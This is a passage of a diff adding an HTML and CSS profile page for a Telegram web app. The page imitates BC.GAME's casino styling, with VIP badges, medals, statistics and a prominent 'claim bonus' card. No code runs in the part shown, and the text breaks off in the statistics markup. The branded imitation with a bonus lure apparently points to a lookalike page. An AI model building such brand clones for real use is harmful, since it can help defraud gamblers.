@@ -1,0 +1,1737 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>BC.GAME - Profile</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #232626;
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        /* Dialog/Modal Style like BC.GAME */
+        .dialog-overlayer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(16, 18, 18, 0.8);
+            z-index: 1000;
+        }
+
+        .dialog-item {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #1a1d1d;
+            z-index: 1001;
+            display: flex;
+            flex-direction: column;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Header - BC.GAME Style */
+        .dialog-title {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            background: #1a1d1d;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 16px;
+            font-weight: 700;
+            position: relative;
+        }
+
+        .dialog-back {
+            background: none;
+            border: none;
+            padding: 0;
+            margin-right: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .dialog-back svg {
+            width: 20px;
+            height: 20px;
+            fill: #8b949e;
+        }
+
+        /* Scrollable Content */
+        .dialog-content {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 100px;
+        }
+
+        #content {
+            overflow-y: auto;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        #content::-webkit-scrollbar {
+            width: 0px;
+            height: 0px;
+            background: transparent;
+        }
+
+        .scroll-container {
+            padding: 0 12px;
+        }
+
+        /* Loading */
+        .loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 80vh;
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #2d333b;
+            border-top-color: #f0b90b;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            margin-top: 12px;
+            color: #8b949e;
+            font-size: 14px;
+        }
+
+        /* Error */
+        .error {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 60vh;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .error-icon {
+            font-size: 60px;
+            margin-bottom: 16px;
+        }
+
+        .error h2 {
+            color: #f85149;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+
+        .error p {
+            color: #8b949e;
+            font-size: 14px;
+        }
+
+        /* Content */
+        .content {
+            display: none;
+        }
+
+        /* Profile Section - BC.GAME Style */
+        .profile-section {
+            width: 100%;
+            padding: 24px 0 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+
+        /* Avatar with Frame */
+        .avatar-container {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #3d4450;
+        }
+
+        .avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .avatar-frame {
+            position: absolute;
+            width: 90px;
+            height: 90px;
+            top: -15px;
+            bottom: -15px;
+            left: -15px;
+            right: -15px;
+            pointer-events: none;
+            object-fit: contain;
+        }
+
+        /* VIP Badge - BC.GAME Style */
+        .vip-badge {
+            height: 20px;
+            border-radius: 4px;
+            padding: 0 8px;
+            margin-top: -8px;
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 21px;
+            color: #fff;
+            text-shadow: rgba(66, 43, 105, 0.5) 0px 1.021px 0px;
+            border: 1px solid;
+        }
+
+        .vip-badge.bronze { 
+            background: linear-gradient(95deg, rgb(206, 175, 152) 12.34%, rgb(101, 95, 83) 51.58%, rgb(206, 182, 152) 94.64%);
+            border-color: rgb(226, 188, 154);
+        }
+        
+        .vip-badge.silver { 
+            background: linear-gradient(95deg, #c0c0c0, #8a8a8a);
+            border-color: rgb(192, 192, 192);
+        }
+        
+        .vip-badge.gold { 
+            background: linear-gradient(95deg, #ffd700, #cc9900);
+            border-color: rgb(255, 215, 0);
+        }
+        
+        .vip-badge.platinum { 
+            background: linear-gradient(95deg, #7c3aed, #5b21b6);
+            border-color: rgb(124, 58, 237);
+        }
+        
+        .vip-badge.diamond { 
+            background: linear-gradient(95deg, #ab0ecf, #6a0dad);
+            border-color: rgb(113, 85, 176);
+        }
+
+        .username {
+            font-size: 20px;
+            font-weight: 800;
+            margin-top: 8px;
+            color: #fff;
+        }
+
+        .uid-row {
+            color: #8b949e;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        /* Likes Button - BC.GAME Style */
+        .likes-btn {
+            position: absolute;
+            left: 0;
+            top: 24px;
+            height: 32px;
+            padding: 0 8px;
+            background: #2a2d2d;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            cursor: default;
+            border: none;
+        }
+
+        .likes-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #f85149;
+        }
+
+        .likes-btn span {
+            margin-left: 4px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        /* Card Style - BC.GAME */
+        .card {
+            width: 100%;
+            background: #2a2d2d;
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 12px;
+        }
+
+        .card-header {
+            width: 100%;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .card-header svg {
+            width: 20px;
+            height: 20px;
+            fill: #fff;
+        }
+
+        .card-title {
+            font-weight: 800;
+            margin-left: 4px;
+            font-size: 14px;
+        }
+
+        .card-title span {
+            margin-left: 4px;
+            color: #fff;
+        }
+
+        .details-btn {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            padding: 0 4px;
+            cursor: pointer;
+            background: none;
+            border: none;
+        }
+
+        .details-btn span {
+            color: #3fb950;
+            font-size: 12px;
+            font-weight: 800;
+        }
+
+        .details-btn svg {
+            width: 16px;
+            height: 16px;
+            fill: #3fb950;
+            transform: rotate(180deg);
+            margin-left: 4px;
+        }
+
+        .divider {
+            width: 100%;
+            height: 1px;
+            background: #3d4450;
+            opacity: 0.2;
+        }
+
+        /* Medals Row - BC.GAME Style */
+        .medals-row {
+            width: 100%;
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            overflow-x: auto;
+            gap: 14px;
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        .medals-row::-webkit-scrollbar {
+            display: none;
+        }
+
+        .medal-item {
+            width: 44px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            flex-shrink: 0;
+            background: transparent;
+            border-radius: 0;
+            overflow: visible;
+        }
+
+        .medal-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            transition: filter 0.2s ease, opacity 0.2s ease;
+        }
+
+        .medal-item.locked img {
+            opacity: 0.35;
+            filter: grayscale(100%);
+        }
+
+        .medal-item.earned img {
+            opacity: 1;
+            filter: none;
+        }
+
+        .hidden-scroll-bar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        .hidden-scroll-bar::-webkit-scrollbar {
+            display: none;
+        }
+
+        /* Statistics Grid - BC.GAME Style */
+        .stats-grid {
+            width: 100%;
+            margin-top: 12px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            gap: 6px;
+        }
+
+        .stat-box {
+            width: calc(50% - 3px);
+            min-width: 0;
+            flex-shrink: 1;
+            background: #363939;
+            border-radius: 8px;
+            height: 65px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 4px 2px;
+        }
+
+        .stat-box.full {
+            width: 100%;
+            margin-top: 0;
+        }
+
+        .stat-label-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: nowrap;
+        }
+
+        .stat-label-row svg {
+            width: 16px;
+            height: 16px;
+            fill: #8b949e;
+            margin-right: 3px;
+            flex-shrink: 0;
+        }
+
+        .stat-label-row span {
+            font-size: 10px;
+            color: #8b949e;
+            white-space: nowrap;
+        }
+
+        .stat-value {
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 2px;
+            color: #fff;
+        }
+
+        /* Bonus Claim Card - Top Player Bonus Style */
+        .bonus-card {
+            position: relative;
+            margin-top: 12px;
+            border-radius: 24px;
+            padding: 22px;
+            overflow: hidden;
+            background: linear-gradient(180deg, #101214 0%, #070b0f 100%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 24px 60px rgba(0, 0, 0, 0.35);
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .bonus-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at top center, rgba(255, 255, 255, 0.08), transparent 34%);
+            pointer-events: none;
+        }
+
+        .bonus-card-row {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .bonus-card-hero {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            padding: 0;
+            background: transparent;
+            width: 100%;
+        }
+
+        .bonus-card-top {
+            text-align: left;
+            width: 100%;
+            padding: 0;
+        }
+
+        .bonus-card-title {
+            margin: 0;
+            font-weight: 800;
+            color: #ffffff;
+            font-size: 1.55rem;
+            line-height: 1.1;
+            letter-spacing: 0.015em;
+        }
+
+        .bonus-card-subtitle {
+            margin: 10px 0 0;
+            color: #9fa7b7;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            max-width: 100%;
+        }
+
+        .bonus-card-image-wrapper {
+            position: absolute;
+            top: 0;
+            right: 0;
+            flex: 0 0 180px;
+            width: 180px;
+            height: 180px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 0 24px 0 24px;
+            overflow: hidden;
+            box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.05), 0 20px 44px rgba(0, 0, 0, 0.28);
+        }
+
+        .bonus-card-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+            transform: none;
+            filter: drop-shadow(0 32px 46px rgba(0, 0, 0, 0.32));
+        }
+
+        .bonus-card-copy {
+            flex: 1 1 auto;
+            min-width: 180px;
+            max-width: calc(100% - 200px);
+            margin-right: 200px;
+        }
+
+        .bonus-card-body {
+            position: relative;
+            z-index: 1;
+            padding: 0;
+        }
+
+        .bonus-text {
+            margin: 18px 0 0;
+            font-size: 14px;
+            font-weight: 600;
+            color: #9fa7b7;
+            line-height: 1.8;
+        }
+
+        .claim-bonus-btn {
+            width: 100%;
+            margin: 0;
+            background: linear-gradient(135deg, #FCE8B8 0%, #EED49A 32%, #DAAA3D 100%);
+            color: #000;
+            border: 1px solid rgba(255, 255, 255, 0.24);
+            padding: 16px 18px;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
+            box-shadow: 0 20px 36px rgba(149, 115, 57, 0.34), 0 0 30px rgba(245, 214, 143, 0.32);
+            backdrop-filter: blur(2px);
+            position: relative;
+            overflow: hidden;
+            min-height: 62px;
+        }
+
+        .claim-bonus-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.45) 0%, rgba(255, 235, 166, 0.18) 25%, rgba(255, 255, 255, 0) 70%);
+            opacity: 0.7;
+            pointer-events: none;
+            border-radius: 16px;
+        }
+
+        .claim-bonus-btn:hover {
+            box-shadow: 0 18px 34px rgba(149, 115, 57, 0.38);
+            transform: translateY(-1px);
+        }
+
+        .claim-bonus-btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 10px 18px rgba(149, 115, 57, 0.28);
+        }
+
+        @media (max-width: 700px) {
+            .bonus-card-copy {
+                max-width: calc(100% - 170px);
+                margin-right: 170px;
+            }
+
+            .bonus-card-image-wrapper {
+                width: 150px;
+                height: 150px;
+                border-radius: 0 20px 0 20px;
+            }
+        }
+
+        @media (max-width: 560px) {
+            .bonus-card-copy {
+                max-width: calc(100% - 140px);
+                margin-right: 140px;
+            }
+
+            .bonus-card-image-wrapper {
+                width: 130px;
+                height: 130px;
+                border-radius: 0 18px 0 18px;
+            }
+
+            .bonus-card-title {
+                font-size: 1.2rem;
+            }
+
+            .bonus-card-subtitle {
+                font-size: 0.88rem;
+            }
+        }
+
+        /* Progress Bar */
+        .bonus-progress-container {
+            margin: 0;
+            display: none;
+            width: 100%;
+        }
+
+        .bonus-progress-bar {
+            width: 100%;
+            height: 62px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.24);
+            overflow: hidden;
+            position: relative;
+            box-shadow: inset 0 0 0 1px rgba(255, 255, 255, 0.08), 0 18px 30px rgba(0, 0, 0, 0.18);
+        }
+
+        .bonus-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, rgba(72, 238, 144, 0.9) 0%, rgba(46, 204, 113, 0.95) 35%, rgba(19, 126, 85, 0.95) 100%);
+            border-radius: 16px;
+            width: 0%;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bonus-progress-fill::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, rgba(255, 255, 255, 0.25) 0%, rgba(255, 255, 255, 0.05) 50%, rgba(255, 255, 255, 0.25) 100%);
+            transform: skewX(-20deg);
+            animation: progress-wave 1.2s linear infinite;
+        }
+
+        @keyframes progress-wave {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        @keyframes progress-animate {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .bonus-progress-text {
+            margin-top: 8px;
+            text-align: center;
+            font-size: 12px;
+            color: #8b949e;
+            font-weight: 500;
+        }
+
+        .claim-progress-btn {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: transparent;
+            color: #82620E;
+            font-size: 15px;
+            font-weight: 800;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: default;
+            pointer-events: none;
+        }
+
+        /* Info Card */
+        .info-row:not(.support-row) {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .info-row:not(.support-row):last-child {
+            border-bottom: none;
+        }
+
+        .support-row {
+            display: grid !important;
+            grid-template-columns: 1fr;
+            gap: 0;
+            align-items: end;
+            margin-top: auto;
+            padding: 12px 0 0;
+            border-bottom: none;
+            grid-auto-rows: min-content;
+        }
+
+        .support-action-btn {
+            width: 100%;
+            display: inline-flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            background: linear-gradient(135deg, #f0b90b 0%, #d4a000 100%);
+            color: #0b0b0b;
+            border: none;
+            padding: 14px 18px;
+            border-radius: 18px;
+            font-size: 14px;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            box-shadow: 0 18px 30px rgba(0, 0, 0, 0.22);
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+            min-height: auto;
+            text-align: center;
+        }
+
+        .support-action-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 800;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            width: 100%;
+            text-align: center;
+        }
+
+        .support-action-note {
+            color: rgba(11, 11, 11, 0.8);
+            font-size: 12px;
+            font-weight: 500;
+            line-height: 1.4;
+            display: block;
+            margin: 0;
+            max-width: 100%;
+            opacity: 0.95;
+            text-align: center;
+        }
+
+        .support-action-btn:hover {
+            transform: translateY(-1px);
+            background: linear-gradient(135deg, #fde589 0%, #e8c543 100%);
+            box-shadow: 0 22px 34px rgba(0, 0, 0, 0.26);
+        }
+
+        .support-action-btn svg {
+            width: 20px;
+            height: 20px;
+            fill: #fff;
+        }
+
+        .support-action-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            width: 100%;
+        }
+
+        @media (max-width: 700px) {
+            .support-row {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .info-label {
+            color: #8b949e;
+            font-size: 13px;
+        }
+
+        .info-value {
+            font-size: 13px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .info-value.green {
+            color: #3fb950;
+        }
+
+        /* Support Button */
+        .support-btn {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, #f0b90b, #d4a000);
+            color: #000;
+            border: none;
+            padding: 8px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .support-btn svg {
+            width: 16px;
+            height: 16px;
+            fill: #000;
+        }
+
+        .info-card {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            min-height: 100%;
+            padding: 22px 22px 0 22px;
+            border-radius: 24px;
+            background: linear-gradient(180deg, rgba(5, 8, 14, 0.92) 0%, rgba(12, 16, 24, 0.96) 100%);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 28px 70px rgba(0, 0, 0, 0.35);
+            overflow: hidden;
+            backdrop-filter: blur(18px);
+        }
+
+        .info-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0) 55%);
+            pointer-events: none;
+        }
+
+        .info-card .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            position: relative;
+            z-index: 1;
+        }
+
+        .info-card .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-card .info-label {
+            color: #c9cdd4;
+            font-size: 13px;
+            letter-spacing: 0.02em;
+        }
+
+        .info-card .info-value {
+            font-size: 14px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .info-card .info-value.green {
+            color: #78e095;
+        }
+
+        .info-card .support-btn {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.14), rgba(255, 255, 255, 0.06));
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.22);
+            padding: 12px 18px;
+            border-radius: 16px;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 10px 20px rgba(0, 0, 0, 0.16);
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.02em;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+        }
+
+        .info-card .support-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 14px 28px rgba(0, 0, 0, 0.18);
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.18), rgba(255, 255, 255, 0.08));
+        }
+
+        .info-card .support-btn svg {
+            fill: #fff;
+        }
+
+        @media (max-width: 700px) {
+            .info-card {
+                padding: 18px;
+            }
+
+            .info-card .info-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+                padding: 14px 0;
+            }
+
+            .info-card .info-row span {
+                width: 100%;
+            }
+        }
+
+        /* Joined Date */
+        .joined-row {
+            margin-top: 12px;
+            margin-bottom: 24px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 28px;
+            color: #8b949e;
+            font-size: 14px;
+        }
+
+        /* Claim Button */
+        .claim-wrapper {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 16px;
+            background: linear-gradient(transparent, #232626 30%);
+            padding-top: 30px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .claim-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #f0b90b, #d4a000);
+            color: #000;
+            border: none;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* Popup */
+        .popup-bg {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .popup-bg.show {
+            display: flex;
+        }
+
+        .popup-box {
+            background: #2a2d2d;
+            border-radius: 16px;
+            padding: 24px;
+            max-width: 320px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .popup-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .popup-box h3 {
+            font-size: 18px;
+            margin-bottom: 8px;
+            color: #fff;
+        }
+
+        .popup-box p {
+            color: #8b949e;
+            font-size: 13px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .popup-btns {
+            display: flex;
+            gap: 10px;
+        }
+
+        .popup-btn {
+            flex: 1;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+        }
+
+        .popup-btn.primary {
+            background: linear-gradient(135deg, #f0b90b, #d4a000);
+            color: #000;
+        }
+
+        .popup-btn.secondary {
+            background: #363939;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="dialog-overlayer"></div>
+    <div class="dialog-item">
+        <!-- Header -->
+        <div class="dialog-title">
+            <button class="dialog-back" type="button">
+                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
+                </svg>
+            </button>
+            Profile
+        </div>
+
+        <!-- Loading -->
+        <div id="loading" class="loading">
+            <div class="spinner"></div>
+            <div class="loading-text">Loading profile...</div>
+        </div>
+
+        <!-- Error -->
+        <div id="error" class="error">
+            <div class="error-icon">❌</div>
+            <h2>Profile Not Found</h2>
+            <p>Unable to load profile. Please check UID.</p>
+        </div>
+
+        <!-- Content -->
+        <div id="content">
+            <div class="scroll-container">
+                <!-- Profile Section -->
+                <div class="profile-section">
+                    <!-- Likes Button -->
+                    <button class="likes-btn">
+                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M25.6759 18.1927L15.9991 28.5948L6.30528 18.1754C6.29932 18.1691 6.29422 18.1627 6.28826 18.1573L5.84415 17.6799L5.86457 17.6581C3.5096 14.6261 3.65678 10.1075 6.30528 7.26058C8.95377 4.41366 13.1575 4.25575 15.9795 6.78685L16 6.76416L16.0221 6.78685L16.0663 6.74601C18.8875 4.25756 23.0598 4.42909 25.6938 7.26058C28.3423 10.1075 28.4895 14.6252 26.1345 17.6581L26.1549 17.6799L25.7091 18.1591L25.6759 18.1927Z"></path>
+                        </svg>
+                        <span id="likes">0</span>
+                    </button>
+
+                    <!-- Avatar -->
+                    <div class="avatar-container">
+                        <img id="avatar" class="avatar" src="" alt="">
+                    </div>
+
+                    <!-- VIP Badge -->
+                    <div id="vip-badge" class="vip-badge platinum">PLATINUM VIP 0</div>
+
+                    <!-- Username -->
+                    <div id="name" class="username">Loading...</div>
+
+                    <!-- UID -->
+                    <p class="uid-row">
+                        <span>User ID:</span>
+                        <span id="uid">...</span>
+                    </p>
+                </div>
+
+                <!-- Medals Card -->
+                <div class="card">
+                    <div class="card-header">
+                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M9.46487 22.5984C11.3168 23.8901 13.5682 24.6527 15.9998 24.6527C18.4314 24.6527 20.6827 23.8901 22.5355 22.5984V26.9173C22.5355 27.8167 21.8031 28.5483 20.9018 28.5483C20.4503 28.5483 20.0421 28.3654 19.747 28.0703L16.0006 25.3277L12.2543 28.0703C12.1059 28.217 11.93 28.3363 11.7339 28.4193C11.5395 28.5024 11.3257 28.5483 11.0986 28.5483C10.6489 28.5483 10.2406 28.3654 9.94199 28.0703C9.79532 27.9219 9.67516 27.7452 9.5921 27.5508C9.50904 27.3564 9.46487 27.1417 9.46487 26.9173V22.5984ZM15.9998 3.45312C21.4152 3.45312 25.803 7.83388 25.803 13.2378C25.803 18.6417 21.4152 23.0225 15.9998 23.0225C10.5844 23.0225 6.19653 18.6426 6.19653 13.2378C6.19653 7.83299 10.5844 3.45312 15.9998 3.45312ZM16.3735 8.7307C15.9565 8.51157 15.4413 8.67239 15.2222 9.08855L14.1575 11.1146C14.0815 11.2586 13.9658 11.3788 13.8244 11.4592L11.8364 12.5901C11.6941 12.6705 11.5784 12.7907 11.5024 12.9356C11.2841 13.3527 11.445 13.8678 11.862 14.086L13.8889 15.1472C14.0329 15.2232 14.1531 15.3381 14.2335 15.4794L15.3689 17.4675C15.4493 17.6088 15.5686 17.7237 15.7126 17.7997C16.1297 18.0188 16.6448 17.858 16.8639 17.4418L17.9286 15.4158C18.0046 15.2718 18.1203 15.1516 18.2617 15.0712L20.2497 13.9402C20.392 13.8598 20.5077 13.7397 20.5837 13.5948C20.802 13.1777 20.6412 12.6626 20.2241 12.4444L18.1972 11.3832C18.0532 11.3072 17.933 11.1923 17.8526 11.051L16.7172 9.06292C16.6368 8.92155 16.5175 8.80669 16.3735 8.7307Z"></path>
+                        </svg>
+                        <p class="card-title"><span>Medals</span><span id="medal-count">0</span></p>
+                        <button class="details-btn">
+                            <span>Details</span>
+                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
+                            </svg>
+                        </button>
+                    </div>
+                    <div class="divider"></div>
+                    <div id="medals-row" class="medals-row hidden-scroll-bar">
+                        <!-- Medals loaded dynamically -->
+                    </div>
+                </div>
+
+                <!-- Statistics Card -->
+                <div class="card">
+                    <div class="card-header">
+                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M16.4271 15.1537C18.0479 15.1537 19.3619 16.4676 19.3619 18.0885V24.7966C19.3619 26.4175 18.0479 27.7314 16.4271 27.7314C14.8062 27.7314 13.4923 26.4175 13.4923 24.7966V18.0885C13.4923 16.4676 14.8062 15.1537 16.4271 15.1537ZM23.9737 11.7996C25.5946 11.7996 26.9086 13.1136 26.9086 14.7344V24.7966C26.9086 26.4175 25.5946 27.7314 23.9737 27.7314C22.3529 27.7314 21.0389 26.4175 21.0389 24.7966V14.7344C21.0389 13.1136 22.3529 11.7996 23.9737 11.7996ZM8.88041 20.1848C10.5013 20.1848 11.8152 21.4987 11.8152 23.1196V24.7966C11.8152 26.4175 10.5013 27.7314 8.88041 27.7314C7.25955 27.7314 5.94559 26.4175 5.94559 24.7966V23.1196C5.94559 21.4987 7.25955 20.1848 8.88041 20.1848ZM26.2579 4.25293C27.0805 4.25293 27.7471 4.91955 27.7471 5.74214C27.7471 6.56473 27.0805 7.23135 26.2579 7.23135H23.749C23.1226 7.23135 22.5323 7.50387 22.1265 7.97008L21.9839 8.15372L20.5979 10.1511C19.7786 11.3317 18.4689 12.0704 17.0451 12.1702L16.7147 12.182H15.1232C14.5085 12.182 13.9274 12.4444 13.5233 12.8955L13.3799 13.0733L11.4832 15.7063C10.6589 16.85 9.36926 17.5619 7.97145 17.6575L7.64695 17.6684H5.75776C4.93518 17.6684 4.26855 17.0018 4.26855 16.1792C4.26855 15.3566 4.93518 14.69 5.75776 14.69H7.64695C8.26158 14.69 8.84267 14.4275 9.24684 13.9764L9.39022 13.7986L11.287 11.1657C12.1112 10.0219 13.4009 9.31003 14.7987 9.21444L15.1232 9.20354H16.7147C17.3411 9.20354 17.9314 8.93102 18.3372 8.46481L18.4798 8.28117L19.8658 6.28382C20.6851 5.10319 21.9948 4.36445 23.4186 4.26467L23.749 4.25293H26.2579Z"></path>
+                        </svg>
+                        <p class="card-title">Statistics</p>
+                        <button class="details-btn">
+                            <span>Details</span>
+                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
+                            </svg>
+                        </button>
+                    </div>
+                    <div class="divider"></div>
+                    <div class="stats-grid">
+                        <div class="stat-box">
+                            <div class="stat-label-row">
+                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
